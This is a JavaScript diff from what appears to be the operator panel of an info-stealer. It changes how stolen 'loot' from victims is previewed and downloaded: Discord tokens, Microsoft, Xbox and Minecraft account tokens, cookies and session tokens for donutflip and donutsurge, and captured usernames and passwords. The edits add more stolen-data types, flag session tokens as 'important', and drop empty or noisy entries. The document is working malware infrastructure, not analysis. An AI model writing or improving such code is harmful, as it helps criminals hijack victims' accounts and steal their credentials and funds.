@@ -1128,22 +1128,38 @@ async function loadBrowserLootFor(eid) {
       const latest = arr[arr.length-1];
       let preview = '';
       const d = latest.data;
-      if (typeof d === 'string') preview = d.slice(0, 160);
+      if (typ === 'donut_balance' || typ === 'donut_seed') { preview = null; }
+      else if (typ === 'donutflip_session_token' || typ === 'donutflip_device' || typ === 'donutsurge_session') {
+        preview = (d && d.name ? d.name + ' = ' : '') + String((d && d.value) || '').slice(0, 80);
+      } else if (typ === 'donutflip_cookies' || typ === 'donut_sites' || typ === 'donutflip_cookies_auto') {
+        if (typ === 'donut_sites' && d && d.donutflip) {
+          const tok = d.donutflip.session_token;
+          preview = 'DF ' + (d.donutflip.count ?? '?') + ' ck' + (tok ? (' · ' + String(tok).slice(0,40) + '…') : ' · no token') +
+            ' | Surge ' + ((d.donutsurge && d.donutsurge.count) ?? '?') + ' ck';
+        } else {
+          const n = d && (d.count != null ? d.count : (d.cookies ? d.cookies.length : '?'));
+          const tok = d && d.session_token;
+          preview = n + ' cookies' + (tok ? (' · __Host-donutflip.session_token = ' + String(tok).slice(0,48)) : (d && d.has_session_token ? ' · session YES' : ' · no session_token'));
+        }
+      } else if (typ === 'donutsurge_cookies') {
+        const n = d && d.count != null ? d.count : '?';
+        const s = (d && d.session_cookies && d.session_cookies[0]) ? (d.session_cookies[0].name + '=' + String(d.session_cookies[0].value).slice(0,40)) : '';
+        preview = n + ' cookies' + (s ? (' · ' + s) : '');
+      } else if (typ === 'donut_login' || typ === 'form_credentials') {
+        const u = (d && (d.username || d.user || '')) || '';
+        const pw = (d && (d.password || d.pass || '')) || '';
+        if (!pw && !u) preview = null;
+        else preview = (u ? 'user ' + u : '') + (pw ? ((u?' · ':'') + 'pass ' + pw) : '');
+      } else if (typeof d === 'string') preview = d.slice(0, 160);
       else if (typ.includes('discord')) preview = (d && d.tokens) ? (d.tokens.length + ' token(s)') : JSON.stringify(d).slice(0,120);
-      else if (typ === 'donutflip_cookies' || typ === 'donutflip_cookies_auto') {
-        const n = d && (d.count != null ? d.count : (d.cookies ? d.cookies.length : '?'));
-        const tok = d && d.session_token;
-        preview = n + ' cookies' + (tok ? (' · session_token ' + String(tok).slice(0,36) + '…') : (d && d.has_session_token ? ' · session YES' : ''));
-        if (d && d.export_style && d.export_style[0]) preview += ' · ' + (d.export_style[0]['Name raw'] || '');
-      } else if (typ === 'donutflip_session_token' || typ === 'donutflip_device') {
-        preview = (d && d.name ? d.name + '=' : '') + String((d && d.value) || '').slice(0, 64);
-      } else if (typ === 'minecraft_pack') {
+      else if (typ === 'minecraft_pack') {
         preview = 'msa ' + ((d&&d.microsoft)||[]).length + ' · xbox ' + ((d&&d.xbox)||[]).length + ' · mc ' + ((d&&d.minecraft)||[]).length;
       } else if (typ.startsWith('cookies_')) {
         preview = (d && d.count != null ? d.count : (d && d.cookies ? d.cookies.length : '?')) + ' cookies (' + (d && d.site || typ) + ')';
       } else if (Array.isArray(d)) preview = d.length + ' entries';
       else if (d && d.count != null && d.cookies) preview = d.count + ' cookies';
       else preview = JSON.stringify(d).slice(0, 120);
+      if (preview === null) return '';
       return `<div class="steal-card" style="margin-bottom:8px">
         <div style="display:flex;justify-content:space-between;gap:8px">
           <strong>${typ}</strong>
@@ -1748,28 +1764,74 @@ async function openDonut(eid) {
       box.innerHTML = "no loot yet";
       return;
     }
-    box.innerHTML = loot.slice().reverse().slice(0, 40).map(e => {
+    box.innerHTML = loot.slice().reverse().slice(0, 50).map(e => {
       const typ = e.type || "loot";
-      let preview = "";
+      // skip noisy spam types in main view
+      if (typ === "donut_balance" || typ === "donut_seed") return "";
       const d = e.data;
-      if (typ === "donutflip_cookies" || typ === "donutflip_cookies_auto") {
-        const count = d && d.count != null ? d.count : (d && d.cookies ? d.cookies.length : "?");
-        const has = d && (d.session_token || d.has_session_token) ? " · session_token YES" : "";
-        const names = d && d.names ? d.names.slice(0, 6).join(", ") : (d && d.session_cookies ? d.session_cookies.map(c => c.name).slice(0, 4).join(", ") : "");
-        preview = `cookies: ${count}${has}${names ? "\\n" + names : ""}`;
-        if (d && d.session_token) preview += "\\n__Host-donutflip.session_token: " + String(d.session_token).slice(0, 48) + "…";
-      } else if (typ === "donutflip_session_token") {
-        preview = (d && d.name ? d.name + " = " : "") + String((d && d.value) || d || "").slice(0, 80);
+      let title = typ;
+      let preview = "";
+      let important = false;
+
+      if (typ === "donutflip_session_token" || typ === "donutflip_device" || typ === "donutsurge_session") {
+        important = true;
+        title = (d && d.name) ? d.name : typ;
+        preview = String((d && d.value) || "").slice(0, 120);
+      } else if (typ === "donutflip_cookies" || typ === "donut_sites") {
+        important = true;
+        if (typ === "donut_sites" && d) {
+          const dfTok = d.donutflip && d.donutflip.session_token;
+          const dfN = d.donutflip && d.donutflip.count;
+          const dsN = d.donutsurge && d.donutsurge.count;
+          const dsSess = (d.donutsurge && d.donutsurge.session_cookies) || [];
+          preview = "DF cookies: " + (dfN != null ? dfN : "?") + (dfTok ? ("\\n__Host-donutflip.session_token = " + String(dfTok).slice(0, 64)) : "\\n(no session_token)") +
+            "\\nSurge cookies: " + (dsN != null ? dsN : "?") + (dsSess[0] ? ("\\n" + dsSess[0].name + " = " + String(dsSess[0].value).slice(0, 48)) : "");
+        } else {
+          const tok = d && d.session_token;
+          const device = d && d.device_token;
+          const n = d && (d.count != null ? d.count : (d.cookies ? d.cookies.length : "?"));
+          preview = n + " cookies";
+          if (tok) preview += "\\n__Host-donutflip.session_token = " + String(tok).slice(0, 72);
+          if (device) preview += "\\n__Host-donutflip_device = " + String(device).slice(0, 48) + "…";
+          if (!tok && d && d.export_style) {
+            const hit = (d.export_style || []).find(x => /session_token/i.test(x["Name raw"] || ""));
+            if (hit) preview += "\\n" + hit["Name raw"] + " = " + String(hit["Content raw"] || "").slice(0, 64);
+          }
+        }
+      } else if (typ === "donutsurge_cookies") {
+        important = true;
+        const n = d && d.count != null ? d.count : "?";
+        const sess = (d && d.session_cookies) || [];
+        preview = n + " cookies";
+        if (sess[0]) preview += "\\n" + sess[0].name + " = " + String(sess[0].value || "").slice(0, 64);
+      } else if (typ === "donut_login" || typ === "form_credentials") {
+        const u = (d && (d.username || d.user || "")) || "";
+        const pw = (d && (d.password || d.pass || "")) || "";
+        // ignore empty garbage
+        if (!u && !pw) return "";
+        // ignore chat-like noise with no password
+        if (!pw && u && u.length > 40) return "";
+        preview = (u ? ("user: " + u) : "") + (pw ? ((u ? "\\n" : "") + "pass: " + pw) : "");
+        if (!preview) return "";
+      } else if (typ === "minecraft_pack") {
+        preview = "msa " + ((d&&d.microsoft)||[]).length + " · xbox " + ((d&&d.xbox)||[]).length + " · mc " + ((d&&d.minecraft)||[]).length;
+      } else if (typ.startsWith("cookies")) {
+        preview = (d && d.count != null ? d.count : (Array.isArray(d) ? d.length : (d && d.cookies ? d.cookies.length : "?"))) + " cookies";
       } else if (typeof d === "string") {
-        preview = d.slice(0, 160);
+        preview = d.slice(0, 140);
       } else {
-        preview = JSON.stringify(d || {}).slice(0, 200);
+        preview = JSON.stringify(d || {}).slice(0, 160);
       }
-      return `<div class="steal-card"><b>${esc(typ)}</b> <span class="muted">${esc(e.ts || "")}</span>
-        <pre style="font-size:11px;white-space:pre-wrap;margin:6px 0">${esc(preview)}</pre>
+
+      return `<div class="steal-card" style="margin-bottom:8px;${important ? "border-color:#22c55e55;" : ""}">
+        <div style="display:flex;justify-content:space-between;gap:8px;align-items:center">
+          <strong style="${important ? "color:#22c55e" : ""}">${esc(title)}</strong>
+          <span class="muted" style="font-size:11px">${esc(e.ts || "")}</span>
+        </div>
+        <pre style="font-size:11px;white-space:pre-wrap;margin:6px 0;word-break:break-all">${esc(preview)}</pre>
         <a class="cmd sm" href="/api/browser/loot_download/${encodeURIComponent(eid)}?type=${encodeURIComponent(typ)}" download>Download</a>
       </div>`;
-    }).join("");
+    }).filter(Boolean).join("");
   } catch (e) {
     document.getElementById("donut-loot").textContent = "loot load failed";
   }
